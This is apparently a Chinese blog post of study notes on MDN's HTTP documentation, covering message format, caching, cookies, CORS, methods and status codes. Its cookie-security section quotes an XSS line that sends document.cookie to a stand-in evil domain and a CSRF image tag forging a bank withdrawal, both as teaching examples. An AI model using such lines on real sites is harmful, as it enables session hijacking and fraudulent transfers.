---
title: MDN - HTTP
date: 2018-10-15 10:03:16
tags:
- MDN
---
> 超文本传输协议(HTTP)是用于传输诸如HTML的超媒体文档的应用层协议。HTPP遵循经典的客户端-服务端模型，客户端打开一个链接以发出请求，然后等待它接收到服务器响应。HTTP是无状态协议，意味着服务器不会在两个请求之间保留任何数据。

<br>

### 1. 概述
#### 1.1 HTTP流
当客户端想要和服务端进行信息交互时，过程表现为下面几步：1. 打开一个TCP连接; 2. 发送一个HTTP报文; 3. 读取服务端返回的报文信息; 4. 关闭连接或者为后续请求重用连接

#### 1.2 HTTP报文
- 请求
包含HTTP的客户端的动作行为(method), 获取资源的路径(URL), HTTP协议版本号, headers, 报文
```
GET /HTTP/1.1
HOST: developer.mozilla.org
Accept-Language: fr
```

- 响应
包含HTTP协议版本号, 状态码(status code), 状态信息, headers, 报文
```
HTTP/1.1 200 OK
Date: Sat, 09 Oct 2010 14:28:02 GMT
Server: Apache
Last-Modified: Tue, 01 Dec 2009 20:18:22 GMT
ETag: "51142bc1-7449-479b075b2891b"
Accept-Ranges: bytes
Content-Length: 29769
Content-Type: text/html

<!DOCTYPE html... (here comes the 29769 bytes of the requested web page)
```
<br>

### 2. HTTP缓存
当web缓存发现请求的资源已经被存储，它会拦截请求，返回该资源的拷贝，而不会去源服务器重新下载。
- 浏览器缓存：浏览器缓存拥有用户通过HTTP下载的所有文档，提供向后/向前导航，保存网页，查看源码，提供缓存内容的离线浏览等功能。
- 代理缓存：热门的资源会被重复使用，如CDN

#### 2.1 Cache-control头
```
Cache-Control: no-store         禁止缓存
Cache-Control: no-cache         强制确认缓存(服务器验证请求中缓存是否过期) 
Cache-Control: public           该响应可以被任何中间人缓存(代理，cdn) 
Cache-Control: private          该响应只能应用于浏览器私有缓存中
Cache-Control: max-age=31536000 缓存有限期：距离请求发起的时间秒数
Cache-Control: must-revalidate  先验证资源的状态，已过期的缓存将不被使用
```
当向服务器发起缓存校验的请求时，服务器会返回`200 OK`表示返回正常的结果，或`304 Not Modified`表示浏览器可以使用本地缓存文件，304可以同时更新缓存文档的过期时间。
<br>

### 3. HTTP Cookies
HTTP Cookie是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务器两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie使基于无状态的HTTP协议记录稳定的状态信息成为可能。

#### 3.1 创建Cookie
服务器可以在响应头里添加一个`Set-Cookie`选项，浏览器收到响应后会保存下Cookie，之后每一次请求中都通过`Cookie`请求头部将Cookie信息发送给服务器。
- Set-Cookie
```
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
// Expire         过期时间
// Secure         只能通过HTTPS协议加密过的请求发送给服务端
// HttpOnly       为避免跨域脚本(XSS)攻击，通过JS的Document.cookie无法访问带有HttpOnly标记的cookie
// Cookie的作用域  cookie应该发送给哪些URL，可以指定Domain和path
```
- JS创建和访问cookie
```
document.cookie = "yummy_cookie=choco";
console.log(document.cookie);
```

#### 3.2 安全
- 会话劫持和XSS
```
(new Image().src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie)
```
- 跨站请求伪造(CSRF)
当你打开这张图片时，如果你已经登录了你的银行账号并且cookie仍然有效，请求将发出
```
<img src="http://bank.example.com/withdraw?account=bob&amount=10000&for=mallory">
```
<br>

### 4. HTTP访问控制(CORS)
跨域资源共享(CORS)是一种机制，当一个资源与该资源本身所在的服务器不同的域或端口请求一个资源时，资源会发起一个跨域HTTP请求。出于安全原因，浏览器限制从脚本内发起的跨域请求。XMLHttpRequest和Fetch API遵循同源策略。

**XMLHttpRequest跨域访问原理**：预检请求，`withCredentials:true`
<br>

### 5. HTTP请求方法
method| |
---|:--:
GET     | 获取数据
HEAD    | 请求一个与get请求的响应相同的响应，但没有响应体
POST    | 将实体提交到指定的资源，通常导致状态或服务器上的更改
PUT     | 请求有效载荷替换目标资源的所有当前表示
DELETE  | 删除指定资源
CONNECT | 建立一个由目标资源标识的服务器的隧道
OPTIONS | 描述目标资源的通信选项
TRACE   | 沿着目标资源的路径执行一个消息环回测试
PATCH   | 对资源应用部分修改
<br>

### 6. HTTP返回状态码
#### 6.1 信息响应
`100 Continue`
临时响应,表明客户端应该继续请求

`101 Switching Protocol`
服务器正在切换协议

`102 Processing (WebDAV)`
服务器已收到并正在处理，但没有响应可用。

#### 6.2 成功响应
2开头,表示成功处理了请求的状态代码。

`200 OK`
服务器已成功处理了请求。 

`201 Created`
请求成功并且服务器创建了新的资源,通常是PUT请求后的响应。 

`202 Accepted`
服务器已接受请求，但尚未处理。 

`203 Non-Authoritative Information`
服务器已成功处理了请求，但返回的信息可能来自另一来源。 

`204 No Content`
服务器成功处理了请求，但没有返回任何内容。 

`205 Reset Content`
服务器成功处理了请求，但没有返回任何内容。

`206 Partial Content`
服务器成功处理了部分 GET 请求。

#### 6.3 重定向
3开头，请求被重定向，表示要完成请求，需要进一步操作。

`300 Multiple Choice`
服务器可根据请求者 (user agent) 选择一项操作，或提供操作列表供请求者选择。 

`301 Moved Permanently`
请求的网页已永久移动到新位置。服务器返回此响应时，会自动将请求者转到新位置。

`302 Found`
服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。

`303 See Other`  
请求者应当对不同的位置使用单独的 GET 请求来检索响应时，服务器返回此代码。

`304 Not Modified`
上次请求后，请求的网页未修改过。服务器返回此响应时，不会返回网页内容。

`307 Temporary Redirect`
服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。


#### 6.4 客户端响应
4开头 （请求错误）这些状态代码表示请求可能出错，妨碍了服务器的处理。

`400 Bad Request`
服务器不理解请求的语法。 

`401 Unauthorized`
请求要求身份验证

`403 Forbidden`
服务器拒绝请求。

`404 Not Found`
服务器找不到请求的网页。

`405 Method Not Allowed`
禁用请求中指定的方法。 

`406 Not Acceptable`
无法使用请求的内容特性响应请求的网页。 

`407 Proxy Authentication Required`
此状态代码与 401（未授权）类似，但指定请求者应当授权使用代理。

`408 Request Timeout`
服务器等候请求时发生超时。 

`409 Conflict`
由于和被请求的资源的当前状态之间存在冲突，请求无法完成。 

`410 Gone`
被请求的资源在服务器上已经不再可用，而且没有任何已知的转发地址。

`411 Length Required`
服务器拒绝在没有定义 Content-Length 头的情况下接受请求。

`412 Precondition Failed`
服务器在验证在请求的头字段中给出先决条件时，没能满足其中的一个或多个。

`413 Payload Too Large`
服务器拒绝处理当前请求，因为该请求提交的实体数据大小超过了服务器愿意或者能够处理的范围。

`414 URI Too Long`
请求的 URI（通常为网址）过长，服务器无法处理。 

`415 Unsupported Media Type`
请求中提交的实体并不是服务器中所支持的格式，请求被拒绝 

`416 Requested Range Not Satisfiable`
请求中包含了 Range 请求头，并且 Range 中指定的任何数据范围都与当前资源的可用范围不重合，同时请求中又没有定义 If-Range 请求头

`417 Expectation Failed`
服务器未满足"期望"请求标头字段的要求。

#### 6.5 服务端响应
5开头（服务器错误）这些状态代码表示服务器在尝试处理请求时发生内部错误。 这些错误可能是服务器本身的错误，而不是请求出错。

`500 Internal Server Error`
服务器遇到了不知道如何处理的情况。

`501 Not Implemented`
此请求方法不被服务器支持且无法被处理。

`502 Bad Gateway`
此错误响应表明服务器作为网关需要得到一个处理这个请求的响应，但是得到一个错误的响应。

`503 Service Unavailable`
服务器没有准备好处理请求。 常见原因是服务器因维护或重载而停机。

`504 Gateway Timeout`
当服务器作为网关，不能及时得到响应时返回此错误代码。

`505 HTTP Version Not Supported`
服务器不支持请求中所用的 HTTP 协议版本。